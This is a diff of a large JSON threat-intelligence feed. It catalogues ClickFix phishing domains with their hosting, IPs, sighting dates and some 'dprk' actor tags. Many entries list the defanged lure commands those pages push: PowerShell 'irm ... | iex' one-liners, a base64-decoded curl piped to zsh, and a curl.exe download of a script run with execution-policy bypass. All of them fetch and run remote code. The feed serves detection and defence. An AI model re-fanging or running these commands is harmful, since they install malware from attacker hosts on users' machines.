-   "url": "https://priyanshuportfolios.rf.gd/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS Wildcard UK Limited",
-   "dns": "infinityfree.com",
-   "ip": "185.27.134.172",
-   "asn": "AS34119",
-   "org": "WILDCARD-AS Wildcard UK Limited, GB",
-   "country": "GB",
-   "ips": [
-    {
-     "ip": "185.27.134.172",
-     "asn": "AS34119",
-     "org": "WILDCARD-AS Wildcard UK Limited, GB",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "priyanshuportfolios.rf.gd",
-     "status": "online",
-     "first_seen": "2026-10-28",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/crabs/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "cosmical2049.com",
-    "xorados.com",
-    "trek-72.com",
-    "t-trustrest.com",
-    "github.pw",
-    "t-trustresnew.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "proaktiftumbuhsolusi.com",
    "type": "domain",
    "category": "clickfix",
@@ -226711,6 +226838,54 @@
    ]
   },
   {
+   "indicator": "projectpizzo.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": "device-code-lab",
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://projectpizzo.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "2a02:4780:45:a398:f4b1:e75e:b1b9:bbf6",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2a02:4780:45:a398:f4b1:e75e:b1b9:bbf6",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "projectpizzo.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "projectrreck.com",
    "type": "domain",
    "category": "clickfix",
@@ -227034,6 +227209,54 @@
     "codes.browse-cdn.beer",
     "browse-cloud.codes"
    ]
+  },
+  {
+   "indicator": "prontointerventosocialedss17.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://www.prontointerventosocialedss17.com/wp-login.php",
+   "brand": null,
+   "product": null,
+   "hosting": "ASN Aruba S.p.A.",
+   "dns": "technorail.com",
+   "ip": "89.46.110.20",
+   "asn": "AS31034",
+   "org": "ARUBA-ASN Aruba S.p.A., IT",
+   "country": "IT",
+   "ips": [
+    {
+     "ip": "89.46.110.20",
+     "asn": "AS31034",
+     "org": "ARUBA-ASN Aruba S.p.A., IT",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.prontointerventosocialedss17.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex;"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": []
   },
   {
    "indicator": "propark.com.au",
@@ -228853,8 +229076,8 @@
     "xorados.com",
     "groverudder12.com",
     "entitlementcheck.pro",
-    "github.pw",
-    "j7tracker.gb.net"
+    "j7tracker.gb.net",
+    "github.pw"
    ],
    "lure_from": [
     "interseq.at"
@@ -230457,6 +230680,54 @@
    ]
   },
   {
+   "indicator": "quickrock.mx",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://quickrock.mx/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "84.32.84.176",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+   "country": "LT",
+   "ips": [
+    {
+     "ip": "84.32.84.176",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "quickrock.mx",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "quicogavara.com",
    "type": "domain",
    "category": "clickfix",
@@ -230923,10 +231194,10 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-10-19",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "http://mail.rahateam.com/",
+   "url": "http://rahateam.com/",
    "brand": null,
    "product": null,
    "hosting": "Vandad Vira Hooman LLC",
@@ -230941,7 +231212,7 @@
      "asn": "AS60631",
      "org": "Vandad Vira Hooman LLC",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -230955,7 +231226,7 @@
      "host": "rahateam.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.rahateam.com",
@@ -231653,7 +231924,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://rapididentify.com/",
@@ -231663,7 +231934,7 @@
    "dns": "Cloudflare",
    "ip": "143.110.216.158",
    "asn": "AS14061",
-   "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
+   "org": "DigitalOcean, LLC",
    "country": "CA",
    "ips": [
     {
@@ -231671,7 +231942,7 @@
      "asn": "AS14061",
      "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -231679,7 +231950,7 @@
      "host": "rapididentify.com",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -238349,6 +238620,54 @@
    ]
   },
   {
+   "indicator": "riskiriswandi.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://riskiriswandi.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "2a02:4780:84:98f6:3b3f:ccf8:d024:7e5",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+   "country": "LT",
+   "ips": [
+    {
+     "ip": "2a02:4780:84:98f6:3b3f:ccf8:d024:7e5",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "riskiriswandi.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "riskogt.com",
    "type": "domain",
    "category": "clickfix",
@@ -241453,7 +241772,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://www.royalensemble.com/",
@@ -241471,7 +241790,7 @@
      "asn": "AS329184",
      "org": "Host Africa (Pty) Ltd",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -241479,13 +241798,13 @@
      "host": "royalensemble.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.royalensemble.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -252651,7 +252970,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://sevtapcapan.com.tr/",
@@ -252669,7 +252988,7 @@
      "asn": "AS203248",
      "org": "BNET BULUT Bilisim Hizmetleri Tic. Ltd. Sti.",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -252677,7 +252996,7 @@
      "host": "sevtapcapan.com.tr",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -253851,7 +254170,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://shannonmoultrie.com/",
@@ -253869,7 +254188,7 @@
      "asn": "AS47583",
      "org": "Hostinger International Limited",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -253877,7 +254196,7 @@
      "host": "shannonmoultrie.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -267462,14 +267781,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "irm 'browse-login[.]info/[id]'|iex",
     "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'hxxps[:]//pillingthat[.]com/BjyDyQzEGz';powershell -ep bypass -File $f\""
    ],
    "connects_to": [
+    "browse-login.info",
     "pillingthat.com"
    ],
    "lure_from": [
-    "browse-cloud.codes",
-    "sentrydb.org"
+    "sentrydb.org",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -280363,7 +280684,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://texasdallashomes.com/",
@@ -280381,7 +280702,7 @@
      "asn": "AS29873",
      "org": "Newfold Digital, Inc.",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -280389,7 +280710,7 @@
      "host": "texasdallashomes.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -280463,7 +280784,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://texojit.com/",
@@ -280481,7 +280802,7 @@
      "asn": "AS204800",
      "org": "WHG-SGP WHG Hosting Services Ltd, GB",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -280489,7 +280810,7 @@
      "host": "texojit.com",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -281406,7 +281727,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-24",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://thebackyarddetailers.com/",
@@ -281424,7 +281745,7 @@
      "asn": "AS29802",
      "org": "HIVELOCITY, Inc.",
      "first_seen": "2026-11-24",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -281432,7 +281753,7 @@
      "host": "thebackyarddetailers.com",
      "status": "online",
      "first_seen": "2026-11-24",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -282291,7 +282612,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://theegroofing.com/",
@@ -282309,7 +282630,7 @@
      "asn": "AS36454",
      "org": "WHG Hosting Services Ltd",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -282317,7 +282638,7 @@
      "host": "theegroofing.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -291904,19 +292225,26 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-18",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://triplinepk.com/",
+   "url": "http://triplinepk.com/",
    "brand": null,
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "92.113.16.105",
+   "ip": "179.61.189.242",
    "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
+   "org": "Hostinger International Limited",
+   "country": "SG",
    "ips": [
+    {
+     "ip": "179.61.189.242",
+     "asn": "AS47583",
+     "org": "Hostinger International Limited",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    },
     {
      "ip": "92.113.16.105",
      "asn": "AS47583",
@@ -291930,7 +292258,7 @@
      "host": "triplinepk.com",
      "status": "online",
      "first_seen": "2026-11-18",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -297676,7 +298004,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://urbanpathwaysqa.com/",
@@ -297694,7 +298022,7 @@
      "asn": "AS47583",
      "org": "Hostinger International Limited",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -297702,7 +298030,7 @@
      "host": "urbanpathwaysqa.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -305387,31 +305715,31 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-21",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://vnailsupply.com/",
+   "url": "http://vnailsupply.com/",
    "brand": null,
    "product": null,
    "hosting": "Hostinger",
    "dns": "dns-parking.com",
-   "ip": "2a02:4780:b:868:0:3ac1:3967:7",
+   "ip": "89.117.9.222",
    "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+   "org": "Hostinger International Limited",
    "country": "US",
    "ips": [
-    {
-     "ip": "2a02:4780:b:868:0:3ac1:3967:7",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
-     "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
-    },
     {
      "ip": "89.117.9.222",
      "asn": "AS47583",
      "org": "Hostinger International Limited",
      "first_seen": "2026-11-25",
+     "last_seen": "2026-11-26"
+    },
+    {
+     "ip": "2a02:4780:b:868:0:3ac1:3967:7",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-21",
      "last_seen": "2026-11-25"
     }
    ],
@@ -305420,7 +305748,7 @@
      "host": "vnailsupply.com",
      "status": "online",
      "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
